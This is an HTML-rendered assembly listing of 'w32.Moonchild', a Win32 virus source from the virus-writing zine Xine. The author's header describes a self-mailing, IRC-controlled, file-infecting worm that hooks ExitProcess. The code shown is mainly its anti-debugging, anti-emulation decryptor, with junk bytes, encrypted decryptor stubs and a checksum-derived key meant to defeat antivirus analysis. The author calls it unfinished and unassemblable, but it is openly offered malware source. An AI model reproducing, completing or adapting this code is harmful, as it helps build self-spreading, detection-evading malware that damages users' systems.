<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>moonchild.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                                              ³ Xine - issue #5 - Phile 204 ³</span><span class="sc0">
</span><span class="sc1">;                                              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         w32.Moonchild.never.ever - ?</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         heh, this was a virus i never finished... though its maybe interesting</span><span class="sc0">
</span><span class="sc1">;         to read, because it is pretty anti debugging, and it is internet aware.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         i made it a pretty long time ago, but i got bored of it, and stopped</span><span class="sc0">
</span><span class="sc1">;         it.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         it contains the poly engine from w9x.matrix (ctrl+c/v), IRC &amp; SMTP</span><span class="sc0">
</span><span class="sc1">;         engine.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         hey.. you can NEVER assemble it :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         but while coding it i learned pretty much.. about SMTP, IRC, etc.</span><span class="sc0">
</span><span class="sc1">;         and i learned how-to-use the RFC's ;)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         bye!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         LW</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         and erh... it contains some very LAME bugs ;) but remember i made it</span><span class="sc0">
</span><span class="sc1">;         when i was young ;)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         and erh2... it is some on-disk-do-not-release version... containg</span><span class="sc0">
</span><span class="sc1">;         comments for me, not for you :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; comment ÿ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  w32.MoonChild by Lifewire [IKX] ... </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  w32 perprocess, self mailing, IRC connecting, listening for commands...</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  I de-optimized it because it was too optimized ;)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  It creates 2 threads, one for IRC connecting and one for self-mailing.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  the threads stay running with the host, and when the hooked ExitProcess api</span><span class="sc0">
</span><span class="sc1">;  is called the threads &amp; wsock services are stopped.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Used docs: Iczelions docs about some things, win32.hlp, IRC &amp; SMTP</span><span class="sc0">
</span><span class="sc1">;             RFC's, GriYo's Parvo. (SMTP code from it)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;             also disassembly/debugged Cain and PeShield.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Greets to: PiepPiep, f0re, Darkman, BillyBelcebu, StarZer0, Dageshi, Asmodeus,</span><span class="sc0">
</span><span class="sc1">;             Evul, Gigabyte, Kamaileon, GriYo, MaskBits, Ruzz, Roadkil, Raid,</span><span class="sc0">
</span><span class="sc1">;             VirusBuster, Ultras, Xsprite, the other IKX members,</span><span class="sc0">
</span><span class="sc1">;             Nala-Bebe-the-friend-of-the-virus-coders, 29A, Matrix Virus Group,</span><span class="sc0">
</span><span class="sc1">;             ShadowvX (nothing wrong with you!) and the #virus people who love</span><span class="sc0">
</span><span class="sc1">;             me... :P also to these guys: hampst0r for being the most annoying</span><span class="sc0">
</span><span class="sc1">;             guy, and stean for his cool metal mp3s heh and ig0r for talking</span><span class="sc0">
</span><span class="sc1">;             about quantumphysics *OUGH!* ;))</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ;----------------------------------------------------------------------------;</span><span class="sc0">
ÿ
</span><span class="sc2">.586p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">tasm</span><span class="sc0">\</span><span class="sc5">bin</span><span class="sc0">\</span><span class="sc5">win32api.inc</span><span class="sc0">

</span><span class="sc5">debug</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">__mCRC32</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0C1A7F39Ah</span><span class="sc0">              </span><span class="sc1">;stolen from a 29a source </span><span class="sc0">
</span><span class="sc5">__mCRC32_init</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">09C3B248Eh</span><span class="sc0">              </span><span class="sc1">;(dunnow the author)</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">string</span><span class="sc0">                          </span><span class="sc1">;actually the creator has lot</span><span class="sc0">
            </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">__mCRC32_init</span><span class="sc0">              </span><span class="sc1">;of skill, it smells a lil</span><span class="sc0">
            </span><span class="sc9">irpc</span><span class="sc0">    </span><span class="sc5">_x</span><span class="sc4">,&lt;</span><span class="sc5">string</span><span class="sc4">&gt;</span><span class="sc0">                 </span><span class="sc1">;like Vecna :)</span><span class="sc0">
        </span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc12">'&amp;_x&amp;'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc9">rept</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
            </span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">__mCRC32</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">))</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">
        </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">ctrlByte</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">crcReg</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">GMEM_ZEROINIT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">40h</span><span class="sc0">                             </span><span class="sc1">;used by GlobalAlloc</span><span class="sc0">
</span><span class="sc5">GMEM_FIXED</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">40000000h</span><span class="sc0">                  </span><span class="sc1">;section flags</span><span class="sc0">
</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">IMAGE_SCN_MEM_SHARED</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">10000000h</span><span class="sc0">  

</span><span class="sc5">RuntimeFiles</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">                               </span><span class="sc1">;nr. file 2 infect</span><span class="sc0">
</span><span class="sc5">virusVsize</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">endofuidata</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">               </span><span class="sc1">;Virtual Size</span><span class="sc0">
</span><span class="sc5">virusRsize</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">endofidata</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">                </span><span class="sc1">;Raw Size</span><span class="sc0">


</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CreateProcessA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;            ;***test</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MoveFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">virusz</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endofidata</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">_CODE</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">


</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       The 'Host'</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">hoststart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;first generation push</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setupcryptor</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     REAL VIRUS STARTS HERE  ***</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">deltabtd</span><span class="sc0">                </span><span class="sc1">;This first part is quite uncommented</span><span class="sc0">
</span><span class="sc5">afterdelta</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;because, even with comments, you</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">                    </span><span class="sc1">;won't understand it :) ... Because</span><span class="sc0">
</span><span class="sc5">deltabtd</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;the reason i wrote this code was to</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">                     </span><span class="sc1">;confuse people (AV) :)</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">a</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc5">a</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">afterdelta</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">b</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cryptedcrypter</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,(</span><span class="sc5">endcryptedcrypter</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">cryptedcrypter</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">                       </span><span class="sc1">;------decryptor initialised</span><span class="sc0">


        </span><span class="sc1">;ebx = offset in crypted crypter (0-xx), edx = offset OFF crypted crypter</span><span class="sc0">

</span><span class="sc5">dec1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">overaddeip1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc5">addeip1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">overaddeip1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">        

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">        


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">next</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">bitch</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc7">fnop</span><span class="sc0">                                    </span><span class="sc1">;anti emu?</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">                                    </span><span class="sc1">;anti emu?</span><span class="sc0">

</span><span class="sc5">addeip2</span><span class="sc4">:</span><span class="sc0">                                        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">bitch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">f</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc0">
</span><span class="sc5">f</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">c</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5196h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">d</span><span class="sc0">

</span><span class="sc5">multicall</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc0">
</span><span class="sc5">key1</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
</span><span class="sc5">d</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">                </span><span class="sc1">;ds:anti emu?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">e</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e8h</span><span class="sc0">
</span><span class="sc5">e</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">endcrypt1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">6612h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dec1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">036h</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">

</span><span class="sc5">endcrypt1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;        int     3                       ;bpint 3 do "rip ip+1" ? :)</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">cryptedcrypter</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;here starts the encrypted decrypter :)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">054h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">034h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vstart</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">067h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">decryptmain</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; The following piece of code creates a sort checksum of important areas, and</span><span class="sc0">
</span><span class="sc1">; includes SoftIce breakpoints in its checksum!! And the main body is crypted</span><span class="sc0">
</span><span class="sc1">; using that checksum too... so av's will have some fun :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (don't think i'm cool :) this was not my idea, but i didn't see it in the vx</span><span class="sc0">
</span><span class="sc1">; scene yet)...</span><span class="sc0">

</span><span class="sc5">createkey</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;using our 'checksum'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dec1</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">vstart</span><span class="sc4">-</span><span class="sc5">dec1</span><span class="sc4">)-</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">genkey</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc5">g</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gg</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f7h</span><span class="sc0">
</span><span class="sc5">genkey</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">multicall</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addeip1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">

        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">;confusing?</span><span class="sc0">

